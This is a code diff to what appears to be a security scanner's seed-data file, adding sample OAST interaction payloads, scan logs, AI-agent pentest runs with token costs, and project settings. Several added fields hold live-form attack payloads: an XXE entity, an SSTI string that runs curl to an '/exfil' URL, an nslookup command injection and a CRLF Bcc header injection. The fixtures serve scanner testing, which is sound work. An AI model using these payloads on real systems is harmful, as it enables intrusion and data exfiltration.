 			InjectionType: "xxe",
 			ModuleID:      "xxe-generic",
+			Payload:       `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://seed-oast-dns-002.` + oastDomain + `/xxe"> ]><foo>&xxe;</foo>`,
 			CreatedAt:     now.Add(-105 * time.Minute),
 		},
 		// HTTP interaction — blind SSTI on admin settings (out-of-band confirmation)
@@ -2162,6 +2293,7 @@ func seedOASTInteractions(scans []*database.Scan) []*database.OASTInteraction {
 			ParameterName: "debug",
 			InjectionType: "ssti",
 			ModuleID:      "ssti-detection",
+			Payload:       "{{''.__class__.__mro__[1].__subclasses__()[407]('curl http://seed-oast-http-002." + oastDomain + "/exfil?data=' + (7*7)|string, shell=True)}}",
 			CreatedAt:     now.Add(-94 * time.Minute),
 		},
 		// DNS interaction — blind command injection probe on legacy app
@@ -2179,6 +2311,7 @@ func seedOASTInteractions(scans []*database.Scan) []*database.OASTInteraction {
 			ParameterName: "name",
 			InjectionType: "cmdi",
 			ModuleID:      "oast-probe",
+			Payload:       "test$(nslookup+seed-oast-dns-003." + oastDomain + ")",
 			CreatedAt:     now.Add(-80 * time.Minute),
 		},
 		// SMTP interaction — email header injection / SSRF via SMTP
@@ -2195,6 +2328,7 @@ func seedOASTInteractions(scans []*database.Scan) []*database.OASTInteraction {
 			ParameterName: "email",
 			InjectionType: "ssrf",
 			ModuleID:      "oast-probe",
+			Payload:       "victim%40example.com%0d%0aBcc%3A+attacker%40seed-oast-smtp-001." + oastDomain,
 			CreatedAt:     now.Add(-96 * time.Minute),
 		},
 		// DNS interaction — uncorrelated (no target context, simulates noise)
@@ -2229,6 +2363,9 @@ func seedScanLogs(scans []*database.Scan) []*database.ScanLog {
 	return []*database.ScanLog{
 		// --- Scan 1: completed, with pause/resume ---
 		{ScanUUID: scans[0].UUID, Level: "info", Message: "scan started", CreatedAt: s1},
+		{ScanUUID: scans[0].UUID, Level: "info", Phase: "source-analysis", Message: "phase started — analyzing /opt/repos/example-frontend", Metadata: `{"source_path":"/opt/repos/example-frontend","framework":"next.js","language":"javascript"}`, CreatedAt: s1.Add(200 * time.Millisecond)},
+		{ScanUUID: scans[0].UUID, Level: "info", Phase: "source-analysis", Message: "extracted 14 routes, 2 auth endpoints, 2 sinks via ast-grep", Metadata: `{"routes":14,"auth_endpoints":2,"sinks":2}`, CreatedAt: s1.Add(500 * time.Millisecond)},
+		{ScanUUID: scans[0].UUID, Level: "info", Phase: "sast", Message: "ast-grep SAST completed: 4 rule hits", Metadata: `{"rules_matched":4,"high":1,"medium":2,"low":1}`, CreatedAt: s1.Add(800 * time.Millisecond)},
 		{ScanUUID: scans[0].UUID, Level: "info", Phase: "discovery", Message: "phase started", CreatedAt: s1.Add(1 * time.Second)},
 		{ScanUUID: scans[0].UUID, Level: "trace", Phase: "discovery", Message: "discovered endpoint GET /api/v1/products", CreatedAt: s1.Add(15 * time.Second)},
 		{ScanUUID: scans[0].UUID, Level: "trace", Phase: "discovery", Message: "discovered endpoint POST /api/v1/orders", CreatedAt: s1.Add(18 * time.Second)},
@@ -2315,12 +2452,17 @@ func seedAgenticScans(scans []*database.Scan) []*database.AgenticScan {
 	return []*database.AgenticScan{
 		// 1. Completed query — code review for XSS
 		{
-			UUID:        "agent-0001-aaaa-bbbb-cccc-ddddeeee0001",
-			Mode:        "query",
-			AgentName:   "claude",
-			TemplateID:  "code-review",
-			TargetURL:   "https://example.com",
-			Status:      "completed",
+			UUID:         "agent-0001-aaaa-bbbb-cccc-ddddeeee0001",
+			Mode:         "query",
+			AgentName:    "claude",
+			Protocol:     "sdk",
+			Model:        "claude-sonnet-4-6",
+			TemplateID:   "code-review",
+			TargetURL:    "https://example.com",
+			SourcePath:   "/opt/repos/example-frontend",
+			SourceType:   database.SourceTypeLocal,
+			SessionDir:   "~/.vigolium/agent-sessions/agent-0001",
+			Status:       "completed",
 			FindingCount: 3,
 			RecordCount:  0,
 			SavedCount:   3,
@@ -2338,28 +2480,36 @@ User-submitted comments are stored and rendered without sanitization.
 ### 3. DOM-based XSS in client router (LOW)
 File: src/static/js/router.js:15
 The hash fragment is used to set innerHTML without encoding.`,
-			AttackPlan: `{"focus_areas":["template rendering","user input handling","DOM manipulation"],"modules":["xss-reflected","xss-stored","xss-dom"],"targets":["search handler","comment submission","client router"]}`,
-			StartedAt:   now.Add(-3 * time.Hour),
-			CompletedAt: now.Add(-3*time.Hour + 45*time.Second),
-			DurationMs:  45000,
-			CreatedAt:   now.Add(-3 * time.Hour),
+			AttackPlan:        `{"focus_areas":["template rendering","user input handling","DOM manipulation"],"modules":["xss-reflected","xss-stored","xss-dom"],"targets":["search handler","comment submission","client router"]}`,
+			TokenUsage:        map[string]interface{}{"query": map[string]interface{}{"input": 8400, "output": 1850}},
+			TotalInputTokens:  8400,
+			TotalOutputTokens: 1850,
+			EstimatedCostUSD:  0.0532,
+			StartedAt:         now.Add(-3 * time.Hour),
+			CompletedAt:       now.Add(-3*time.Hour + 45*time.Second),
+			DurationMs:        45000,
+			CreatedAt:         now.Add(-3 * time.Hour),
 		},
 		// 2. Completed autopilot — interactive scan
 		{
-			UUID:        "agent-0002-aaaa-bbbb-cccc-ddddeeee0002",
-			ScanUUID:    scans[0].UUID,
-			Mode:        "autopilot",
-			AgentName:   "claude",
-			InputRaw:    "https://example.com/api/v1/products",
-			InputType:   "url",
-			TargetURL:   "https://example.com",
-			VulnType:    "sqli",
-			Status:      "completed",
-			FindingCount: 2,
-			RecordCount:  18,
-			SavedCount:   2,
-			SessionID:    "agent-sess-a1b2c3d4",
-			PromptSent:   "Test the API endpoint https://example.com/api/v1/products for SQL injection vulnerabilities. Use both error-based and time-based techniques.",
+			UUID:             "agent-0002-aaaa-bbbb-cccc-ddddeeee0002",
+			ScanUUID:         scans[0].UUID,
+			Mode:             "autopilot",
+			AgentName:        "claude",
+			Protocol:         "sdk",
+			Model:            "claude-opus-4-7",
+			InputRaw:         "https://example.com/api/v1/products",
+			InputType:        "url",
+			TargetURL:        "https://example.com",
+			VulnType:         "sqli",
+			InputRecordCount: 1,
+			Status:           "completed",
+			FindingCount:     2,
+			RecordCount:      18,
+			SavedCount:       2,
+			SessionID:        "agent-sess-a1b2c3d4",
+			SessionDir:       "~/.vigolium/agent-sessions/agent-0002",
+			PromptSent:       "Test the API endpoint https://example.com/api/v1/products for SQL injection vulnerabilities. Use both error-based and time-based techniques.",
 			AgentRawOutput: `I'll systematically test the /api/v1/products endpoint for SQL injection.
 
 ## Step 1: Enumerate parameters
@@ -2375,90 +2525,213 @@ Confirmed blind SQL injection via time delay: id=1'+AND+pg_sleep(5)--
 ## Results
 - SQLi Error-based in /api/v1/products?id= (CRITICAL)
 - SQLi Time-based blind in /api/v1/products?id= (HIGH)`,
-			StartedAt:   now.Add(-2*time.Hour - 30*time.Minute),
-			CompletedAt: now.Add(-2*time.Hour - 27*time.Minute),
-			DurationMs:  180000,
-			CreatedAt:   now.Add(-2*time.Hour - 30*time.Minute),
+			TokenUsage: map[string]interface{}{
+				"plan": map[string]interface{}{"input": 4200, "output": 780},
+				"scan": map[string]interface{}{"input": 18500, "output": 3120},
+			},
+			TotalInputTokens:  22700,
+			TotalOutputTokens: 3900,
+			EstimatedCostUSD:  0.6330,
+			StorageURL:        "gs://vigolium-agents/proj-default/agent-0002.tar.gz",
+			StartedAt:         now.Add(-2*time.Hour - 30*time.Minute),
+			CompletedAt:       now.Add(-2*time.Hour - 27*time.Minute),
+			DurationMs:        180000,
+			CreatedAt:         now.Add(-2*time.Hour - 30*time.Minute),
 		},
-		// 3. Completed swarm — full 7-phase scan
+		// 3. Completed swarm — full 7-phase scan (master run)
 		{
-			UUID:         "agent-0003-aaaa-bbbb-cccc-ddddeeee0003",
-			ScanUUID:     scans[1].UUID,
-			Mode:         "swarm",
-			AgentName:    "claude",
-			TargetURL:    "https://api.shop.local",
-			Status:       "completed",
-			CurrentPhase: "report",
-			PhasesRun:    []string{"source-analysis", "discover", "plan", "scan", "triage", "rescan", "report"},
-			FindingCount: 5,
-			RecordCount:  120,
-			SavedCount:   5,
-			AttackPlan:   `{"phases":["source-analysis","discover","plan","scan","triage","rescan","report"],"focus_areas":["authentication bypass","IDOR","mass assignment"],"modules":["sqli","ssti","idor","mass-assign"],"custom_extensions":["shop-auth-bypass.js"]}`,
-			TriageResult: `{"total_findings":8,"confirmed":5,"false_positives":3,"severity_breakdown":{"critical":1,"high":2,"medium":2},"notes":"3 SSTI findings were false positives caused by template syntax in API documentation responses"}`,
-			ResultJSON:   `{"findings":[{"module":"sqli-error","severity":"critical","url":"https://api.shop.local/api/v1/auth/login","description":"SQL injection in login endpoint allows authentication bypass"},{"module":"idor","severity":"high","url":"https://api.shop.local/api/v1/users/2","description":"IDOR allows accessing other users' profiles by changing user ID"},{"module":"mass-assign","severity":"high","url":"https://api.shop.local/api/v1/users/me","description":"Mass assignment allows setting admin role via PATCH request"},{"module":"ssti","severity":"medium","url":"https://api.shop.local/api/v1/products","description":"Server-side template injection in product description field"},{"module":"crlf","severity":"medium","url":"https://api.shop.local/api/v1/export","description":"CRLF injection in export filename parameter"}]}`,
-			StartedAt:    now.Add(-1*time.Hour - 30*time.Minute),
-			CompletedAt:  now.Add(-1 * time.Hour),
-			DurationMs:   1800000,
-			CreatedAt:    now.Add(-1*time.Hour - 30*time.Minute),
+			UUID:             "agent-0003-aaaa-bbbb-cccc-ddddeeee0003",
+			ScanUUID:         scans[1].UUID,
+			Mode:             "swarm",
+			AgentName:        "claude",
+			Protocol:         "sdk",
+			Model:            "claude-opus-4-7",
+			TargetURL:        "https://api.shop.local",
+			SourcePath:       "https://github.com/vigolium/shop-api",
+			SourceType:       database.SourceTypeGitURL,
+			InputRecordCount: 28,
+			Status:           "completed",
+			CurrentPhase:     "report",
+			PhasesRun:        []string{"source-analysis", "discover", "plan", "scan", "triage", "rescan", "report"},
+			FindingCount:     5,
+			RecordCount:      120,
+			SavedCount:       5,
+			AttackPlan:       `{"phases":["source-analysis","discover","plan","scan","triage","rescan","report"],"focus_areas":["authentication bypass","IDOR","mass assignment"],"modules":["sqli","ssti","idor","mass-assign"],"custom_extensions":["shop-auth-bypass.js"]}`,
+			TriageResult:     `{"total_findings":8,"confirmed":5,"false_positives":3,"severity_breakdown":{"critical":1,"high":2,"medium":2},"notes":"3 SSTI findings were false positives caused by template syntax in API documentation responses"}`,
+			ResultJSON:       `{"findings":[{"module":"sqli-error","severity":"critical","url":"https://api.shop.local/api/v1/auth/login","description":"SQL injection in login endpoint allows authentication bypass"},{"module":"idor","severity":"high","url":"https://api.shop.local/api/v1/users/2","description":"IDOR allows accessing other users' profiles by changing user ID"},{"module":"mass-assign","severity":"high","url":"https://api.shop.local/api/v1/users/me","description":"Mass assignment allows setting admin role via PATCH request"},{"module":"ssti","severity":"medium","url":"https://api.shop.local/api/v1/products","description":"Server-side template injection in product description field"},{"module":"crlf","severity":"medium","url":"https://api.shop.local/api/v1/export","description":"CRLF injection in export filename parameter"}]}`,
+			TokenUsage: map[string]interface{}{
+				"source-analysis": map[string]interface{}{"input": 42000, "output": 5400},
+				"plan":            map[string]interface{}{"input": 15200, "output": 2100},
+				"extension":       map[string]interface{}{"input": 9800, "output": 1750},
+				"triage":          map[string]interface{}{"input": 28000, "output": 4200},
+				"rescan":          map[string]interface{}{"input": 12000, "output": 1800},
+			},
+			TotalInputTokens:  107000,
+			TotalOutputTokens: 15250,
+			EstimatedCostUSD:  2.7488,
+			SessionID:         "agent-sess-swarm-shop",
+			SessionDir:        "~/.vigolium/agent-sessions/agent-0003",
+			StorageURL:        "gs://vigolium-agents/proj-default/agent-0003.tar.gz",
+			StartedAt:         now.Add(-1*time.Hour - 30*time.Minute),
+			CompletedAt:       now.Add(-1 * time.Hour),
+			DurationMs:        1800000,
+			CreatedAt:         now.Add(-1*time.Hour - 30*time.Minute),
+		},
+		// 3a. Swarm sub-run — source-analysis specialist spawned by agent-0003
+		{
+			UUID:             "agent-0003a-aaaa-bbbb-cccc-ddddeeee0003",
+			ScanUUID:         scans[1].UUID,
+			ParentRunUUID:    "agent-0003-aaaa-bbbb-cccc-ddddeeee0003",
+			Mode:             "swarm",
+			AgentName:        "source-analyst",
+			Protocol:         "sdk",
+			Model:            "claude-sonnet-4-6",
+			TargetURL:        "https://api.shop.local",
+			SourcePath:       "https://github.com/vigolium/shop-api",
+			SourceType:       database.SourceTypeGitURL,
+			InputRecordCount: 28,
+			Status:           "completed",
+			CurrentPhase:     "source-analysis",
+			PhasesRun:        []string{"source-analysis"},
+			FindingCount:     0,
+			RecordCount:      28,
+			SavedCount:       0,
+			AgentRawOutput:   "Analyzed 12 route files in app/routes/. Identified 28 HTTP routes, 4 auth endpoints, 7 SQL sinks, 2 filesystem sinks. Output written to session plan.",
+			TokenUsage: map[string]interface{}{
+				"explore":    map[string]interface{}{"input": 18500, "output": 2400},
+				"format":     map[string]interface{}{"input": 12000, "output": 1800},
+				"extensions": map[string]interface{}{"input": 11500, "output": 1200},
+			},
+			TotalInputTokens:  42000,
+			TotalOutputTokens: 5400,
+			EstimatedCostUSD:  0.2268,
+			SessionDir:        "~/.vigolium/agent-sessions/agent-0003/children/source-analysis",
+			StartedAt:         now.Add(-1*time.Hour - 28*time.Minute),
+			CompletedAt:       now.Add(-1*time.Hour - 18*time.Minute),
+			DurationMs:        600000,
+			CreatedAt:         now.Add(-1*time.Hour - 28*time.Minute),
+		},
+		// 3b. Swarm sub-run — triage specialist spawned by agent-0003
+		{
+			UUID:             "agent-0003b-aaaa-bbbb-cccc-ddddeeee0003",
+			ScanUUID:         scans[1].UUID,
+			ParentRunUUID:    "agent-0003-aaaa-bbbb-cccc-ddddeeee0003",
+			Mode:             "swarm",
+			AgentName:        "triager",
+			Protocol:         "sdk",
+			Model:            "claude-opus-4-7",
+			TargetURL:        "https://api.shop.local",
+			InputRecordCount: 8,
+			Status:           "completed",
+			CurrentPhase:     "triage",
+			PhasesRun:        []string{"triage"},
+			FindingCount:     5,
+			SavedCount:       5,
+			TriageResult:     `{"total_findings":8,"confirmed":5,"false_positives":3,"severity_breakdown":{"critical":1,"high":2,"medium":2}}`,
+			TokenUsage: map[string]interface{}{
+				"triage": map[string]interface{}{"input": 28000, "output": 4200},
+			},
+			TotalInputTokens:  28000,
+			TotalOutputTokens: 4200,
+			EstimatedCostUSD:  0.7350,
+			SessionDir:        "~/.vigolium/agent-sessions/agent-0003/children/triage",
+			RetryCount:        1,
+			StartedAt:         now.Add(-1*time.Hour - 12*time.Minute),
+			CompletedAt:       now.Add(-1*time.Hour - 5*time.Minute),
+			DurationMs:        420000,
+			CreatedAt:         now.Add(-1*time.Hour - 12*time.Minute),
 		},
 		// 4. Running swarm — in scan phase
 		{
-			UUID:         "agent-0004-aaaa-bbbb-cccc-ddddeeee0004",
-			Mode:         "swarm",
-			AgentName:    "claude",
-			TargetURL:    "https://blog.test",
-			Status:       "running",
-			CurrentPhase: "scan",
-			PhasesRun:    []string{"discover", "plan"},
-			FindingCount: 0,
-			RecordCount:  30,
-			AttackPlan:   `{"phases":["discover","plan","scan","triage","report"],"focus_areas":["XSS in comments","CSRF on forms","path traversal"],"modules":["xss","csrf","lfi"]}`,
-			StartedAt:    now.Add(-12 * time.Minute),
-			CreatedAt:    now.Add(-12 * time.Minute),
+			UUID:              "agent-0004-aaaa-bbbb-cccc-ddddeeee0004",
+			Mode:              "swarm",
+			AgentName:         "claude",
+			Protocol:          "sdk",
+			Model:             "claude-opus-4-7",
+			TargetURL:         "https://blog.test",
+			InputRecordCount:  14,
+			Status:            "running",
+			CurrentPhase:      "scan",
+			PhasesRun:         []string{"discover", "plan"},
+			FindingCount:      0,
+			RecordCount:       30,
+			AttackPlan:        `{"phases":["discover","plan","scan","triage","report"],"focus_areas":["XSS in comments","CSRF on forms","path traversal"],"modules":["xss","csrf","lfi"]}`,
+			TokenUsage:        map[string]interface{}{"plan": map[string]interface{}{"input": 6800, "output": 1200}},
+			TotalInputTokens:  6800,
+			TotalOutputTokens: 1200,
+			EstimatedCostUSD:  0.1920,
+			SessionDir:        "~/.vigolium/agent-sessions/agent-0004",
+			StartedAt:         now.Add(-12 * time.Minute),
+			CreatedAt:         now.Add(-12 * time.Minute),
 		},
-		// 5. Failed query — agent timeout
+		// 5. Failed query — agent timeout (pipe protocol, cheap)
 		{
-			UUID:         "agent-0005-aaaa-bbbb-cccc-ddddeeee0005",
-			Mode:         "query",
-			AgentName:    "gemini",
-			TemplateID:   "endpoint-discovery",
-			TargetURL:    "https://unreachable.internal",
-			Status:       "failed",
-			ErrorMessage: "agent execution timed out after 120s: context deadline exceeded",
-			PromptSent:   "Discover all API endpoints exposed by the application at https://unreachable.internal. Analyze JavaScript bundles and API documentation.",
-			StartedAt:    now.Add(-6 * time.Hour),
-			CompletedAt:  now.Add(-6*time.Hour + 2*time.Minute),
-			DurationMs:   120000,
-			CreatedAt:    now.Add(-6 * time.Hour),
+			UUID:              "agent-0005-aaaa-bbbb-cccc-ddddeeee0005",
+			Mode:              "query",
+			AgentName:         "gemini",
+			Protocol:          "pipe",
+			Model:             "gemini-2.5-pro",
+			TemplateID:        "endpoint-discovery",
+			TargetURL:         "https://unreachable.internal",
+			Status:            "failed",
+			ErrorMessage:      "agent execution timed out after 120s: context deadline exceeded",
+			PromptSent:        "Discover all API endpoints exposed by the application at https://unreachable.internal. Analyze JavaScript bundles and API documentation.",
+			TokenUsage:        map[string]interface{}{"query": map[string]interface{}{"input": 1200, "output": 0}},
+			TotalInputTokens:  1200,
+			TotalOutputTokens: 0,
+			EstimatedCostUSD:  0.0015,
+			RetryCount:        2,
+			StartedAt:         now.Add(-6 * time.Hour),
+			CompletedAt:       now.Add(-6*time.Hour + 2*time.Minute),
+			DurationMs:        120000,
+			CreatedAt:         now.Add(-6 * time.Hour),
 		},
 		// 6. Completed swarm — multi-input targeted scan
 		{
-			UUID:         "agent-0006-aaaa-bbbb-cccc-ddddeeee0006",
-			ScanUUID:     scans[0].UUID,
-			Mode:         "scan",
-			AgentName:    "claude",
-			TargetURL:    "https://example.com",
-			VulnType:     "xss,sqli,lfi",
-			ModuleNames:  []string{"xss-reflected", "xss-stored", "sqli-error", "sqli-time", "lfi"},
-			Status:       "completed",
-			FindingCount: 7,
-			RecordCount:  85,
-			SavedCount:   7,
-			AttackPlan:   `{"iterations":3,"batch_size":5,"modules":["xss-reflected","xss-stored","sqli-error","sqli-time","lfi"],"focus_areas":["search functionality","file inclusion","API parameters"],"custom_extensions":["example-auth-header.js"]}`,
-			TriageResult: `{"total_findings":12,"confirmed":7,"false_positives":5,"severity_breakdown":{"critical":1,"high":3,"medium":2,"low":1}}`,
-			ResultJSON:   `{"findings":[{"module":"sqli-error","severity":"critical","url":"https://example.com/api/v1/products?id=1"},{"module":"xss-reflected","severity":"high","url":"https://example.com/search?q=test"},{"module":"lfi","severity":"high","url":"https://legacy.example.com/index.php?page=home"},{"module":"xss-reflected","severity":"high","url":"https://example.com/profile/1"},{"module":"sqli-time","severity":"medium","url":"https://example.com/api/v1/orders?status=pending"},{"module":"xss-stored","severity":"medium","url":"https://blog.test/post/hello-world/comment"},{"module":"lfi","severity":"low","url":"https://example.com/static/../README.md"}]}`,
-			StartedAt:    now.Add(-45 * time.Minute),
-			CompletedAt:  now.Add(-30 * time.Minute),
-			DurationMs:   900000,
-			CreatedAt:    now.Add(-45 * time.Minute),
+			UUID:             "agent-0006-aaaa-bbbb-cccc-ddddeeee0006",
+			ScanUUID:         scans[0].UUID,
+			Mode:             "scan",
+			AgentName:        "claude",
+			Protocol:         "sdk",
+			Model:            "claude-opus-4-7",
+			TargetURL:        "https://example.com",
+			VulnType:         "xss,sqli,lfi",
+			ModuleNames:      []string{"xss-reflected", "xss-stored", "sqli-error", "sqli-time", "lfi"},
+			InputRecordCount: 15,
+			Status:           "completed",
+			FindingCount:     7,
+			RecordCount:      85,
+			SavedCount:       7,
+			AttackPlan:       `{"iterations":3,"batch_size":5,"modules":["xss-reflected","xss-stored","sqli-error","sqli-time","lfi"],"focus_areas":["search functionality","file inclusion","API parameters"],"custom_extensions":["example-auth-header.js"]}`,
+			TriageResult:     `{"total_findings":12,"confirmed":7,"false_positives":5,"severity_breakdown":{"critical":1,"high":3,"medium":2,"low":1}}`,
+			ResultJSON:       `{"findings":[{"module":"sqli-error","severity":"critical","url":"https://example.com/api/v1/products?id=1"},{"module":"xss-reflected","severity":"high","url":"https://example.com/search?q=test"},{"module":"lfi","severity":"high","url":"https://legacy.example.com/index.php?page=home"},{"module":"xss-reflected","severity":"high","url":"https://example.com/profile/1"},{"module":"sqli-time","severity":"medium","url":"https://example.com/api/v1/orders?status=pending"},{"module":"xss-stored","severity":"medium","url":"https://blog.test/post/hello-world/comment"},{"module":"lfi","severity":"low","url":"https://example.com/static/../README.md"}]}`,
+			TokenUsage: map[string]interface{}{
+				"plan":   map[string]interface{}{"input": 12000, "output": 1900},
+				"scan":   map[string]interface{}{"input": 34000, "output": 5200},
+				"triage": map[string]interface{}{"input": 18000, "output": 3100},
+			},
+			TotalInputTokens:  64000,
+			TotalOutputTokens: 10200,
+			EstimatedCostUSD:  1.7250,
+			SessionID:         "agent-sess-example-scan",
+			SessionDir:        "~/.vigolium/agent-sessions/agent-0006",
+			StorageURL:        "gs://vigolium-agents/proj-default/agent-0006.tar.gz",
+			StartedAt:         now.Add(-45 * time.Minute),
+			CompletedAt:       now.Add(-30 * time.Minute),
+			DurationMs:        900000,
+			CreatedAt:         now.Add(-45 * time.Minute),
 		},
 		// 7. Completed query — secret detection
 		{
 			UUID:         "agent-0007-aaaa-bbbb-cccc-ddddeeee0007",
 			Mode:         "query",
 			AgentName:    "claude",
+			Protocol:     "codex-sdk",
+			Model:        "gpt-5",
 			TemplateID:   "secret-scan",
 			TargetURL:    "https://api.shop.local",
+			SourcePath:   "/opt/repos/shop-api",
+			SourceType:   database.SourceTypeLocal,
 			Status:       "completed",
 			FindingCount: 4,
 			SavedCount:   4,
@@ -2480,25 +2753,34 @@ Hardcoded PostgreSQL password: "postgres:p@ssw0rd@localhost:5432"
 ### 4. AWS Access Key in Test File (LOW)
 File: test/fixtures/aws_config.json:3
 AWS access key ID found: AKIAIOSFODNN7EXAMPLE (appears to be test/example key)`,
-			StartedAt:    now.Add(-4 * time.Hour),
-			CompletedAt:  now.Add(-4*time.Hour + 30*time.Second),
-			DurationMs:   30000,
-			CreatedAt:    now.Add(-4 * time.Hour),
+			TokenUsage:        map[string]interface{}{"query": map[string]interface{}{"input": 22000, "output": 3100}},
+			TotalInputTokens:  22000,
+			TotalOutputTokens: 3100,
+			EstimatedCostUSD:  0.3350,
+			SessionDir:        "~/.vigolium/agent-sessions/agent-0007",
+			StartedAt:         now.Add(-4 * time.Hour),
+			CompletedAt:       now.Add(-4*time.Hour + 30*time.Second),
+			DurationMs:        30000,
+			CreatedAt:         now.Add(-4 * time.Hour),
 		},
 		// 8. Completed autopilot with source code
 		{
-			UUID:         "agent-0008-aaaa-bbbb-cccc-ddddeeee0008",
-			Mode:         "autopilot",
-			AgentName:    "opencode",
-			InputRaw:     "curl -X POST https://api.shop.local/api/v1/auth/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"test\"}'",
-			InputType:    "curl",
-			TargetURL:    "https://api.shop.local",
-			VulnType:     "authentication",
-			Status:       "completed",
-			FindingCount: 2,
-			RecordCount:  12,
-			SavedCount:   2,
-			SessionID:    "agent-sess-e5f6g7h8",
+			UUID:             "agent-0008-aaaa-bbbb-cccc-ddddeeee0008",
+			Mode:             "autopilot",
+			AgentName:        "opencode",
+			Protocol:         "opencode-sdk",
+			Model:            "claude-sonnet-4-6",
+			InputRaw:         "curl -X POST https://api.shop.local/api/v1/auth/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"test\"}'",
+			InputType:        "curl",
+			TargetURL:        "https://api.shop.local",
+			VulnType:         "authentication",
+			InputRecordCount: 1,
+			Status:           "completed",
+			FindingCount:     2,
+			RecordCount:      12,
+			SavedCount:       2,
+			SessionID:        "agent-sess-e5f6g7h8",
+			SessionDir:       "~/.vigolium/agent-sessions/agent-0008",
 			AgentRawOutput: `I'll test the authentication endpoint for common vulnerabilities.
 
 ## Step 1: Baseline request
@@ -2516,32 +2798,48 @@ JWT token uses HS256 with weak secret. Token can be forged.
 ## Results
 - Missing rate limiting on login endpoint (MEDIUM)
 - Weak JWT signing secret allows token forgery (HIGH)`,
-			StartedAt:    now.Add(-1*time.Hour - 15*time.Minute),
-			CompletedAt:  now.Add(-1*time.Hour - 12*time.Minute),
-			DurationMs:   180000,
-			CreatedAt:    now.Add(-1*time.Hour - 15*time.Minute),
+			TokenUsage: map[string]interface{}{
+				"plan":  map[string]interface{}{"input": 3200, "output": 580},
+				"probe": map[string]interface{}{"input": 9800, "output": 1400},
+			},
+			TotalInputTokens:  13000,
+			TotalOutputTokens: 1980,
+			EstimatedCostUSD:  0.0687,
+			StartedAt:         now.Add(-1*time.Hour - 15*time.Minute),
+			CompletedAt:       now.Add(-1*time.Hour - 12*time.Minute),
+			DurationMs:        180000,
+			CreatedAt:         now.Add(-1*time.Hour - 15*time.Minute),
 		},
 		// 9. Cancelled swarm
 		{
-			UUID:         "agent-0009-aaaa-bbbb-cccc-ddddeeee0009",
-			Mode:         "swarm",
-			AgentName:    "claude",
-			TargetURL:    "https://example.com",
-			Status:       "cancelled",
-			CurrentPhase: "scan",
-			PhasesRun:    []string{"discover", "plan"},
-			RecordCount:  42,
-			ErrorMessage: "cancelled by user",
-			StartedAt:    now.Add(-8 * time.Hour),
-			CompletedAt:  now.Add(-7*time.Hour - 45*time.Minute),
-			DurationMs:   900000,
-			CreatedAt:    now.Add(-8 * time.Hour),
+			UUID:              "agent-0009-aaaa-bbbb-cccc-ddddeeee0009",
+			Mode:              "swarm",
+			AgentName:         "claude",
+			Protocol:          "sdk",
+			Model:             "claude-opus-4-7",
+			TargetURL:         "https://example.com",
+			Status:            "cancelled",
+			CurrentPhase:      "scan",
+			PhasesRun:         []string{"discover", "plan"},
+			RecordCount:       42,
+			ErrorMessage:      "cancelled by user",
+			TokenUsage:        map[string]interface{}{"plan": map[string]interface{}{"input": 8500, "output": 1400}},
+			TotalInputTokens:  8500,
+			TotalOutputTokens: 1400,
+			EstimatedCostUSD:  0.2325,
+			SessionDir:        "~/.vigolium/agent-sessions/agent-0009",
+			StartedAt:         now.Add(-8 * time.Hour),
+			CompletedAt:       now.Add(-7*time.Hour - 45*time.Minute),
+			DurationMs:        900000,
+			CreatedAt:         now.Add(-8 * time.Hour),
 		},
 		// 10. Pending query — just queued
 		{
 			UUID:       "agent-0010-aaaa-bbbb-cccc-ddddeeee0010",
 			Mode:       "query",
 			AgentName:  "claude",
+			Protocol:   "sdk",
+			Model:      "claude-sonnet-4-6",
 			TemplateID: "code-review",
 			TargetURL:  "https://blog.test",
 			Status:     "pending",
@@ -2590,36 +2888,59 @@ func seedProjects(users []*database.User) []*database.Project {
 	now := time.Now()
 	return []*database.Project{
 		{
-			UUID:        database.DefaultProjectUUID,
-			Name:        "Default Project",
-			Description: "Default project for all scan data when no project is specified",
-			OwnerUUID:   users[0].UUID,
-			CreatedAt:   now.Add(-30 * 24 * time.Hour),
-			UpdatedAt:   now.Add(-1 * time.Hour),
+			UUID:           database.DefaultProjectUUID,
+			Name:           "Default Project",
+			Description:    "Default project for all scan data when no project is specified",
+			OwnerUUID:      users[0].UUID,
+			ConfigPath:     "~/.vigolium/vigolium-configs.yaml",
+			Tags:           []string{"default", "local"},
+			AllowedDomains: []string{"example.com", "api.shop.local", "blog.test", "admin.example.com", "legacy.example.com"},
+			AllowedEmails:  []string{"admin@vigolium.dev", "analyst@vigolium.dev", "ci-bot@vigolium.dev"},
+			DefaultTarget:  "https://example.com",
+			LastScanAt:     now.Add(-10 * time.Minute),
+			CreatedAt:      now.Add(-30 * 24 * time.Hour),
+			UpdatedAt:      now.Add(-1 * time.Hour),
 		},
 		{
-			UUID:        "proj-0002-aaaa-bbbb-cccc-ddddeeee0002",
-			Name:        "E-Commerce Platform Audit",
-			Description: "Security assessment of the api.shop.local e-commerce platform including API and frontend",
-			OwnerUUID:   users[1].UUID,
-			CreatedAt:   now.Add(-7 * 24 * time.Hour),
-			UpdatedAt:   now.Add(-2 * time.Hour),
+			UUID:           "proj-0002-aaaa-bbbb-cccc-ddddeeee0002",
+			Name:           "E-Commerce Platform Audit",
+			Description:    "Security assessment of the api.shop.local e-commerce platform including API and frontend",
+			OwnerUUID:      users[1].UUID,
+			ConfigPath:     "~/.vigolium/projects/shop-audit.yaml",
+			Tags:           []string{"ecommerce", "api", "quarterly-audit"},
+			AllowedDomains: []string{"api.shop.local", "shop.local", "checkout.shop.local"},
+			AllowedEmails:  []string{"analyst@vigolium.dev", "shop-security@example.com"},
+			DefaultTarget:  "https://api.shop.local",
+			LastScanAt:     now.Add(-4*time.Hour - 30*time.Minute),
+			CreatedAt:      now.Add(-7 * 24 * time.Hour),
+			UpdatedAt:      now.Add(-2 * time.Hour),
 		},
 		{
-			UUID:        "proj-0003-aaaa-bbbb-cccc-ddddeeee0003",
-			Name:        "Blog Application Pentest",
-			Description: "Targeted pentest of blog.test for XSS and content injection vulnerabilities",
-			OwnerUUID:   users[1].UUID,
-			CreatedAt:   now.Add(-3 * 24 * time.Hour),
-			UpdatedAt:   now.Add(-3 * time.Hour),
+			UUID:           "proj-0003-aaaa-bbbb-cccc-ddddeeee0003",
+			Name:           "Blog Application Pentest",
+			Description:    "Targeted pentest of blog.test for XSS and content injection vulnerabilities",
+			OwnerUUID:      users[1].UUID,
+			Tags:           []string{"pentest", "xss-focused"},
+			AllowedDomains: []string{"blog.test", "cdn.blog.test"},
